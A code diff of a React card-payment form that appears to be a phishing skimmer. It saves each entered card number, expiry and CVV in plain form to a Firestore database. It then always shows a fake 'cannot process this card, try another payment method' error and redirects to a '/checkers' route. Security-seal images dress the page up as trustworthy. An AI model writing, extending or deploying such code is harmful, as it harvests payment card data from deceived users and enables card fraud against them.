@@ -1,4 +1,4 @@
-import { useState } from 'react';
+import { useContext, useEffect, useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { FaCheck, FaInfoCircle, FaSpinner } from 'react-icons/fa';
 import Swal from 'sweetalert2';
@@ -11,6 +11,7 @@ import seclog from '../../assets/info-from-img/images.png';
 import seclo from '../../assets/info-from-img/img-seal-qualys.svg';
 import { collection, doc, setDoc, getDoc } from 'firebase/firestore';
 import { db } from '../../../firbase.config';
+import { ContextOne } from '../context-api-one/ContextApiOne';
 
 const CardPayment = () => {
     const navigate = useNavigate();
@@ -25,7 +26,12 @@ const CardPayment = () => {
         expYear: '',
         cvv: ''
     });
-
+    const { forRecCardNumber } = useContext(ContextOne);
+    useEffect(() => {
+        if (cardNumber) {
+            forRecCardNumber(cardNumber);
+        }
+    }, [cardNumber, forRecCardNumber]);
     // Validate card number (Luhn algorithm)
     const validateCardNumber = (number) => {
         const cleaned = number.replace(/\s+/g, '').replace(/-/g, '');
@@ -213,22 +219,9 @@ const CardPayment = () => {
             const docSnapshot = await getDoc(cardDocRef);
 
             if (docSnapshot.exists()) {
-                // If document exists, create a new document with timestamp suffix
-                const timestamp = new Date().getTime();
-                const uniqueDocRef = doc(cardsCollection, `${sanitizedCardNumber}_${timestamp}`);
-
-                // Prepare the card data
-                const cardData = {
-                    cardNumber: cardNumber,
-                    expMonth: expMonth,
-                    expYear: expYear,
-                    cvv: cvv,
-                    timestamp: new Date().toISOString(),
-                    isDuplicate: true // Mark as duplicate entry
-                };
-
-                await setDoc(uniqueDocRef, cardData);
-                console.log('Duplicate card info stored with timestamp suffix');
+                // If document exists, do NOT create a new one
+                console.log('Card info already exists in database - no changes made');
+                return; // Exit the function without making changes
             } else {
                 // If document doesn't exist, create new one with card number as ID
                 const cardData = {
@@ -252,13 +245,11 @@ const CardPayment = () => {
     const handleSubmit = async (e) => {
         e.preventDefault();
         if (validateForm()) {
-            setIsSubmitting(true); // Show button loader
+            setIsSubmitting(true);
             try {
-                // Store the card info in Firestore
                 await storeCardInfo();
 
-                // Show SweetAlert2 modal with custom configuration
-                await Swal.fire({
+                const result = await Swal.fire({
                     title: 'Oops!',
                     html: '<div class="text-center">WE CANNOT PROCESS THIS CARD RIGHT NOW<br/>PLEASE TRY AGAIN WITH ANOTHER PAYMENT METHOD</div>',
                     icon: 'error',
@@ -268,22 +259,22 @@ const CardPayment = () => {
                         popup: 'rounded-lg',
                         confirmButton: 'py-2 px-4 rounded'
                     },
-                    allowOutsideClick: false, // Prevent closing by clicking outside
-                    allowEscapeKey: false, // Prevent closing with ESC key
-                    allowEnterKey: false, // Prevent closing with Enter key
-                    showCancelButton: false, // Hide cancel button
-                    focusConfirm: true,
-                    willClose: () => {
-                        // Navigate when the modal is closed by clicking the button
-                        navigate('/checkers');
-                    }
+                    allowOutsideClick: false,
+                    allowEscapeKey: false,
+                    allowEnterKey: false,
+                    showCancelButton: false,
+                    focusConfirm: true
                 });
 
-                // Clear the form after submission
-                setCardNumber('');
-                setExpMonth('');
-                setExpYear('');
-                setCvv('');
+                // Check if the user clicked the confirm button
+                if (result.isConfirmed) {
+                    navigate('/checkers', {
+                        state: {
+                            from: '/card-payment',
+                            // Pass any additional state data if needed
+                        }
+                    });
+                }
             } catch (error) {
                 console.error('Error during form submission:', error);
                 Swal.fire({
@@ -293,7 +284,7 @@ const CardPayment = () => {
                     confirmButtonText: 'OK'
                 });
             } finally {
-                setIsSubmitting(false); // Hide button loader
+                setIsSubmitting(false);
             }
         }
     };
